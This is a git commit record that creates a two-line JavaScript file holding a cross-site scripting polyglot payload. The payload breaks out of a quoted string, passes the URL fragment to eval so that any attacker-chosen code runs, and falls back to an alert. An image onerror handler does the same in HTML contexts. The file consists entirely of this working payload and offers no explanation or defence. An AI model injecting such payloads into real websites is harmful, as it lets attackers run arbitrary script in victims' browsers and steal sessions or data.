91fd274d2863e93a575cea762ce3ec60f4c7b92e
vah_13 <vvvaagn@gmail.com>
2019-06-19 17:05:32 +0300

    Create js.js

---
+++ js.js
@@ -0,0 +1,2 @@
+'';var msgbox;if(location.hash){eval(location.hash.slice(1))}else{alert(document.location)}//<img src="xxx://" onerror="if(location.hash){eval(location.hash.slice(1))}else{alert(document.location)}">
+msgbox+1
